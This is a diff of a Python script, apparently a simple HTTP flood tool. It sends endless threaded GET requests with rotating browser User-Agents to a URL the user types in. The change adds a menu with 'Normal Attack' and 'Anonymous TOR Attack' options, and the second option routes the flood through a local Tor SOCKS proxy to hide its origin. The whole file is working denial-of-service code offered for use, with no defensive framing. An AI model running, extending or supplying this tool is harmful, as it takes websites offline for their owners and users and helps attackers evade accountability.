@@ -1,6 +1,8 @@
 import threading
 import requests
 import os
+import sys
+from pystyle import Colorate, Colors
 
 banner ="""
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -22,12 +24,22 @@ banner ="""
 def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
-def make_request(url, user_agent):
-    headers = {'User-Agent': user_agent}
-    response = requests.get(url, headers=headers, timeout=1)
-    print(f"Response Code: {response.status_code}")
+def make_request(url, user_agent, option):
+    try:
+        if option == 1:
+            headers = {'User-Agent': user_agent}
+            response = requests.get(url, headers=headers, timeout=1)
+            print(f"Response Code: {response.status_code}")
+        elif option == 2:
+            proxies = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+            headers = {'User-Agent': user_agent}
+            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
+            print(f'Response Code: {response.status_code}')
+    except Exception as e:
+        print(Colorate.Horizontal(Colors.green_to_blue, f"Failed to make request to {url}: {str(e)}"))
+        sys.exit()
 
-def main(url):
+def main(url, option):
     user_agents = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36',
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
@@ -60,7 +72,7 @@ def main(url):
     
     threads = []
     for ua in user_agents:
-        thread = threading.Thread(target=make_request, args=(url, ua))
+        thread = threading.Thread(target=make_request, args=(url, ua, option))
         threads.append(thread)
         thread.start()
     
@@ -69,17 +81,26 @@ def main(url):
 
 if __name__ == '__main__':
     clear_console()
-    print(banner)
-    url = input('URL =>')
-    # Validación de la URL
-    if not url.startswith(('https://', 'http://')):
-        url = 'http://' + url
+    print(Colorate.Horizontal(Colors.red_to_blue, banner))
+    print(Colorate.Horizontal(Colors.green_to_yellow, '[1] Normal Attack\n[2] Anonymous TOR Attack'))
     try:
-        while True:
-            main(url)
+        option = int(input(Colorate.Horizontal(Colors.green_to_yellow,'=> ')))
+        if option == 1 or option == 2:
+            url = input(Colorate.Horizontal(Colors.green_to_yellow, 'URL => '))
+            # Validación de la URL
+            if not url.startswith(('https://', 'http://')):
+                url = 'http://' + url
+            try:
+                while True:
+                    main(url, option)
+            except KeyboardInterrupt:
+                clear_console()
+                sys.exit()
+        else:
+            print(Colorate.Horizontal(Colors.red_to_green, '!!Incorrect option!!'))
+
     except KeyboardInterrupt:
-        clear_console()
-        os.sys.exit()
+        sys.exit()    
 
-
-
+    except Exception as e:
+        print(Colorate.Horizontal(Colors.red_to_blue, f'!ERROR {str(e)}!'))
